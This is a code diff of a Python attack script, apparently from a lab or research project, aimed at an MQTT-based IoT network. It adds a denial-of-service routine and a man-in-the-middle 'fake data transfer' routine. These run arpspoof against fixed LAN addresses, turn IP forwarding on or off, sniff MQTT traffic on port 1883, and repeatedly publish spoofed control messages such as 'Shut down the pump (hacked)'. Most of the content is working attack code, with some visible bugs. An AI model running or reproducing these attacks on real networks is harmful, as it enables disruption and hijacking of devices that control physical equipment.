@@ -123,29 +123,79 @@ def process_packet(packet):
 
 def execute_attack(json_response):
     if (json_response["attack_class_dos"]):
-        print("Perform Denial of Service")
+        denial_of_service()
     elif (json_response["attack_class_fdt"]):
         print("Perform fake data transfer")
         fake_data_transfer_attack()
     elif (json_response["attack_class_phsh"]):
         print("Perform phishing attack")
+def denial_of_service():
+    try:
+        print("Performing Denial of Serivce Attack....")
+        os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
+        #Reroutes packets from the MQTT server through this computer.
+        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "192.168.1.1", ">", "garbage.txt"])
+        while True:
+            os.system('mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "Shut down the pump (hacked)"')
+            time.sleep(5)
+    except KeyboardInterrupt:
+        print("Stopping DDOS process...")
+        os.kill(nodeAttack.pid, signal.SIGTERM)
 
+def intercept_modify_forward(packet):
+    if packet.haslayer(TCP) and packet.haslayer(IP):
+        ip_src = packet[IP].src
+        tcp_sport = packet[TCP].sport
+#        print("incomming ")
+        # Check if this is MQTT traffic between the two VMs
+        if (tcp_sport == 1883 and ip_src == "192.168.1."):
+            # Attempt to parse MQTT payload
+            topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
+#            print("conversation detected")
+            if topic and message:
+                print(f"MQTT Packet from {ip_src} to {ip_dst}\nTopic: {topic}\nMessage: {message}")
+                sniffed_message = message
+                sniffed_topic = topic
 def fake_data_transfer_attack():
     #PERFORM PACKET SNIFFING:
     #start_time = time.time()
+    print("Performing Fake Data Transfer...")
     print("Sniffing Packets...")
     sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 10)
     print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
     
-    #MAN IN THE MIDDLE ATTACK:
-    #Enables ip forwarding (hence passing on the packets we get)
-    os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
-    #Reroutes packets from the MQTT server through this computer.
-    process = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "-r", "192.168.1.1"])
-    time.sleep(10)
-    os.kill(process.pid, signal.SIGTERM)
+    try:
+        #Enables ip forwarding (hence passing on the packets we get)
+        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
+        #Reroutes packets from the MQTT server through this computer.
+        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "192.168.1.1", ">", "garbage.txt"])
+        
+        sniff(filter='tcp port 1883', prn=process_packet, store=False)
+    except KeyboardInterrupt:
+        print("Stopping sniffing")
+        os.kill(nodeAttack.pid, signal.SIGTERM)
+
+    """
+    try:
+        sniff(filter='tcp', prn=intercept_modify_forward, iface=interface)
+        #MAN IN THE MIDDLE ATTACK:
+        #Enables ip forwarding (hence passing on the packets we get)
+        os.system("sudo sysctl -w net.ipv4.ip_forward=0")
+        #Reroutes the packets from the gateway router through this computer.
+        routerAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.1", "192.168.1.12"])
+        time.sleep(10)
+        #Reroutes packets from the MQTT server through this computer.
+        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "192.168.1.1"])
+        while True:
+            os.system('mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "The message has been hijacked"')
+            time.sleep(5)
+    except KeyboardInterrupt:
+        print("Stopping ARPSPOOFING process...")
+        os.kill(nodeAttack.pid, signal.SIGTERM)
+        os.kill(routerAttack.pid, signal.SIGTERM)
+    """
     #TODO: Use identified topic to stop message from going through and send fake message.
-    
+
 client = mqtt.Client()
 
 client.on_connect = on_connect
@@ -158,14 +208,16 @@ client.subscribe("attackMessage")
 client.loop_start()
 
 
-while True: 
-    #lang_classification()
-    if(rec):
-        #response = lang_classification()
-        json_string = '{"attack_class_fdt": true, "attack_class_dos": false, "attack_class_phsh": false}'
-        response = json.loads(json_string)
-        execute_attack(response)
-        rec = False
-        break
-        #print(1)
+try:
+    while True: 
+        #lang_classification()
+        if(rec):
+            #response = lang_classification()
+            json_string = '{"attack_class_fdt": false, "attack_class_dos": true, "attack_class_phsh": false}'
+            response = json.loads(json_string)
+            execute_attack(response)
+            rec = False
+            break
+except KeyboardInterrupt:
+    print("Stopping Attack....")
 
